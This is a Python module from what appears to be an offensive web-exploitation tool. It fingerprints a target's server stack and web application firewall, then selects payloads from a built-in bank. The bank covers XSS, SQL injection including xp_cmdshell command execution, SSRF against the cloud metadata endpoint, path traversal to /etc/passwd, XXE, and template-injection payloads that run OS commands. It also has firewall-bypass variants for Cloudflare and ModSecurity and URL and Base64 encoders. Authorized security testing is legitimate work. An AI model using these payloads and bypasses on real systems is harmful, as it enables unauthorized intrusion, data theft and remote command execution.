"""
Payload Context Builder — generates context-aware exploit payloads.

Detects the target technology stack and WAF presence, then selects and
mutates payloads from the internal bank to maximise success probability.
No external wordlists required.
"""

from __future__ import annotations

import base64
import logging
import re
import urllib.parse
from dataclasses import dataclass, field
from enum import Enum
from typing import Optional

from webxploit.core.models import VulnType

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Stack & WAF enumerations
# ---------------------------------------------------------------------------


class TechStack(str, Enum):
    PHP = "php"
    JAVA = "java"
    DOTNET = "dotnet"
    NODEJS = "nodejs"
    PYTHON = "python"
    RUBY = "ruby"
    UNKNOWN = "unknown"


class WAFType(str, Enum):
    CLOUDFLARE = "cloudflare"
    MODSECURITY = "modsecurity"
    AKAMAI = "akamai"
    IMPERVA = "imperva"
    SUCURI = "sucuri"
    NONE = "none"
    UNKNOWN = "unknown"


# ---------------------------------------------------------------------------
# Fingerprinting signals
# ---------------------------------------------------------------------------

_STACK_SIGNALS: dict[TechStack, list[tuple[str, str]]] = {
    TechStack.PHP: [
        ("header", "X-Powered-By: PHP"),
        ("header", "Set-Cookie: PHPSESSID"),
        ("url", r"\.php($|\?)"),
        ("body", "PHP Fatal error"),
        ("body", "<?php"),
    ],
    TechStack.JAVA: [
        ("header", "X-Powered-By: JSP"),
        ("header", "Set-Cookie: JSESSIONID"),
        ("url", r"\.jsp($|\?)"),
        ("body", "java.lang."),
        ("body", "at org.apache"),
    ],
    TechStack.DOTNET: [
        ("header", "X-Powered-By: ASP.NET"),
        ("header", "X-AspNet-Version"),
        ("url", r"\.(aspx?|cshtml)($|\?)"),
        ("body", "System.Web"),
        ("body", "__VIEWSTATE"),
    ],
    TechStack.NODEJS: [
        ("header", "X-Powered-By: Express"),
        ("body", "Cannot GET"),
        ("body", "Error: ENOENT"),
    ],
    TechStack.PYTHON: [
        ("header", "Server: gunicorn"),
        ("header", "Server: Werkzeug"),
        ("body", "Traceback (most recent call last)"),
        ("body", "Django"),
        ("body", "Flask"),
    ],
    TechStack.RUBY: [
        ("header", "Server: Puma"),
        ("header", "X-Powered-By: Phusion Passenger"),
        ("body", "ActionController"),
        ("body", "Ruby on Rails"),
    ],
}

_WAF_SIGNALS: dict[WAFType, list[tuple[str, str]]] = {
    WAFType.CLOUDFLARE: [
        ("header", "Server: cloudflare"),
        ("header", "CF-RAY"),
        ("body", "Attention Required! | Cloudflare"),
    ],
    WAFType.MODSECURITY: [
        ("header", "Server: ModSecurity"),
        ("body", "ModSecurity Action"),
        ("body", "Not Acceptable!"),
        ("status", "406"),
        ("status", "501"),
    ],
    WAFType.IMPERVA: [
        ("header", "X-Iinfo"),
        ("body", "Incapsula"),
    ],
    WAFType.AKAMAI: [
        ("header", "Server: AkamaiGHost"),
        ("body", "Access Denied | Akamai"),
    ],
    WAFType.SUCURI: [
        ("header", "X-Sucuri-ID"),
        ("body", "Sucuri WebSite Firewall"),
    ],
}


# ---------------------------------------------------------------------------
# Payload bank
# ---------------------------------------------------------------------------

# Structure: VulnType → { "base": [...], "waf_bypass": { WAFType: [...] } }
_PAYLOAD_BANK: dict[VulnType, dict] = {
    VulnType.XSS: {
        "base": [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)",
            "<body onload=alert(1)>",
        ],
        "waf_bypass": {
            WAFType.CLOUDFLARE: [
                "<ScRipT>alert(1)</ScRipT>",
                "<<SCRIPT>alert(1)//<</SCRIPT>",
                '<img src=x onerror="&#97;lert(1)">',
                "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
            ],
            WAFType.MODSECURITY: [
                '<a href="jav&#x09;ascript:alert(1)">click</a>',
                "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)>",
                "<input autofocus onfocus=alert(1)>",
                "<details open ontoggle=alert(1)>",
            ],
        },
    },
    VulnType.SQLI: {
        "base": [
            "' OR 1=1--",
            "' OR '1'='1",
            "1; SELECT sleep(5)--",
            "' UNION SELECT NULL--",
            "1' AND SLEEP(5)--",
        ],
        "waf_bypass": {
            WAFType.CLOUDFLARE: [
                "' /*!OR*/ 1=1--",
                "'/**/OR/**/1=1--",
                "' OR 0x313d31--",
            ],
            WAFType.MODSECURITY: [
                "' /*!50000OR*/ 1=1--",
                "1'%09OR%091=1--",
                "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            ],
        },
    },
    VulnType.SSRF: {
        "base": [
            "http://169.254.169.254/latest/meta-data/",
            "http://127.0.0.1:80/",
            "http://[::1]/",
            "http://localhost/",
            "http://0.0.0.0:22/",
        ],
        "waf_bypass": {
            WAFType.CLOUDFLARE: [
                "http://0x7f000001/",  # 127.0.0.1 in hex
                "http://2130706433/",  # 127.0.0.1 as decimal
                "http://127.1/",
                "http://①②⑦.⓪.⓪.①/",  # Unicode lookalike
            ],
        },
    },
    VulnType.LFI: {
        "base": [
            "../../../../etc/passwd",
            "../../../../windows/win.ini",
            "....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
        ],
        "waf_bypass": {
            WAFType.MODSECURITY: [
                "..%c0%af..%c0%afetc%c0%afpasswd",
                "..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd",
            ],
        },
    },
    VulnType.SSTI: {
        "base": [
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
            "<%= 7*7 %>",
            "{{config}}",
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
        ],
        "waf_bypass": {},
    },
    VulnType.XXE: {
        "base": [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]><foo>&xxe;</foo>',
        ],
        "waf_bypass": {},
    },
}


# ---------------------------------------------------------------------------
# Fingerprint result
# ---------------------------------------------------------------------------


@dataclass
class FingerprintResult:
    stack: TechStack
    waf: WAFType
    indicators: list[str] = field(default_factory=list)
    confidence: float = 0.0

    def __str__(self) -> str:
        return (
            f"Stack: {self.stack.value} | WAF: {self.waf.value} | Confidence: {self.confidence:.0%}"
        )


# ---------------------------------------------------------------------------
# Payload result
# ---------------------------------------------------------------------------


@dataclass
class PayloadResult:
    vuln_type: VulnType
    payloads: list[str]
    stack: TechStack
    waf: WAFType
    encoded: dict[str, list[str]] = field(default_factory=dict)  # encoding → payloads

    def best(self) -> str:
        """Return the first (highest-priority) payload."""
        return self.payloads[0] if self.payloads else ""

    def all_encodings(self) -> list[str]:
        """Flatten all encoded variants."""
        result = list(self.payloads)
        for variants in self.encoded.values():
            result.extend(variants)
        return result


# ---------------------------------------------------------------------------
# Fingerprinter
# ---------------------------------------------------------------------------


class Fingerprinter:
    """
    Lightweight stack and WAF fingerprinter.
    Works on static response data (headers, body, URL) — no live requests.

    For live fingerprinting integrate with your HTTP session and pass
    the response dict: {"headers": {...}, "body": "...", "status": "200", "url": "..."}
    """

    def fingerprint(
        self,
        url: str = "",
        headers: Optional[dict[str, str]] = None,
        body: str = "",
        status_code: str = "200",
    ) -> FingerprintResult:
        headers = headers or {}
        headers_str = "\n".join(f"{k}: {v}" for k, v in headers.items())
        context = {
            "url": url,
            "header": headers_str,
            "body": body,
            "status": status_code,
        }

        stack, stack_hits = self._detect(context, _STACK_SIGNALS, TechStack.UNKNOWN)
        waf, waf_hits = self._detect(context, _WAF_SIGNALS, WAFType.UNKNOWN)

        all_hits = stack_hits + waf_hits
        confidence = min(len(all_hits) * 0.25, 1.0)

        return FingerprintResult(
            stack=stack,
            waf=waf,
            indicators=all_hits,
            confidence=confidence,
        )

    # ------------------------------------------------------------------ #

    def _detect(self, context: dict, signals: dict, unknown_value) -> tuple:
        scores: dict = {}
        hits_per: dict = {}
        for candidate, patterns in signals.items():
            for source, pattern in patterns:
                text = context.get(source, "")
                if re.search(pattern, text, re.IGNORECASE):
                    scores[candidate] = scores.get(candidate, 0) + 1
                    hits_per.setdefault(candidate, []).append(pattern)
        if not scores:
            return unknown_value, []
        best = max(scores, key=lambda k: scores[k])
        return best, hits_per.get(best, [])


# ---------------------------------------------------------------------------
# Payload builder
# ---------------------------------------------------------------------------


class PayloadBuilder:
    """
    Selects and mutates payloads based on detected stack and WAF.

    Usage
    -----
    ::

        builder = PayloadBuilder()
        fp = builder.fingerprinter.fingerprint(url=url, headers=resp_headers, body=resp_body)
        result = builder.build(VulnType.XSS, fingerprint=fp)
        print(result.best())
    """

    def __init__(self) -> None:
        self.fingerprinter = Fingerprinter()

    def build(
        self,
        vuln_type: VulnType,
        fingerprint: Optional[FingerprintResult] = None,
        include_encodings: bool = True,
        max_payloads: int = 10,
    ) -> PayloadResult:
        """
        Build a prioritised payload list for the given vuln type.

        Parameters
        ----------
        vuln_type:
            The vulnerability to generate payloads for.
        fingerprint:
            Optional fingerprint result; if None, returns base payloads only.
        include_encodings:
            If True, also generate URL/HTML/Base64 encoded variants.
        max_payloads:
            Cap on total payloads returned.
        """
        bank = _PAYLOAD_BANK.get(vuln_type, {})
        base: list[str] = list(bank.get("base", []))
        waf_specific: list[str] = []

        if fingerprint and fingerprint.waf != WAFType.UNKNOWN:
            bypasses = bank.get("waf_bypass", {})
            waf_specific = list(bypasses.get(fingerprint.waf, []))

        # Stack-specific mutations
        if fingerprint:
            base = self._apply_stack_mutations(base, vuln_type, fingerprint.stack)

        # Prioritise WAF bypass payloads when a WAF is detected
        if waf_specific:
            payloads = waf_specific + base
        else:
            payloads = base

        payloads = payloads[:max_payloads]

        encoded: dict[str, list[str]] = {}
        if include_encodings and payloads:
            encoded = self._generate_encodings(payloads[:3])  # encode top 3 only

        return PayloadResult(
            vuln_type=vuln_type,
            payloads=payloads,
            stack=fingerprint.stack if fingerprint else TechStack.UNKNOWN,
            waf=fingerprint.waf if fingerprint else WAFType.UNKNOWN,
            encoded=encoded,
        )

    def quick(self, vuln_type: VulnType, waf: WAFType = WAFType.NONE) -> str:
        """Return a single best payload with no fingerprinting overhead."""
        bank = _PAYLOAD_BANK.get(vuln_type, {})
        bypasses = bank.get("waf_bypass", {}).get(waf, [])
        base = bank.get("base", [])
        payloads = bypasses or base
        return payloads[0] if payloads else ""

    # ------------------------------------------------------------------ #
    # Mutations
    # ------------------------------------------------------------------ #

    def _apply_stack_mutations(
        self, payloads: list[str], vuln_type: VulnType, stack: TechStack
    ) -> list[str]:
        if vuln_type == VulnType.SSTI and stack == TechStack.PYTHON:
            # Prefer Jinja2/Mako payloads
            jinja2 = [
                "{{7*7}}",
                "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
                "{{''.__class__.mro()[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}",
            ]
            return jinja2 + [p for p in payloads if p not in jinja2]

        if vuln_type == VulnType.SSTI and stack == TechStack.JAVA:
            freemarker = [
                "${\"freemarker.template.utility.Execute\"?new()('id')}",
                "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex('id')}",
            ]
            return freemarker + payloads

        if vuln_type == VulnType.SQLI and stack == TechStack.DOTNET:
            mssql = [
                "'; EXEC xp_cmdshell('whoami')--",
                "1; SELECT @@version--",
                "' UNION SELECT NULL, name FROM sys.tables--",
            ]
            return mssql + payloads

        return payloads

    def _generate_encodings(self, payloads: list[str]) -> dict[str, list[str]]:
        return {
            "url": [urllib.parse.quote(p, safe="") for p in payloads],
            "double_url": [
                urllib.parse.quote(urllib.parse.quote(p, safe=""), safe="") for p in payloads
            ],
            "base64": [base64.b64encode(p.encode()).decode() for p in payloads],
        }
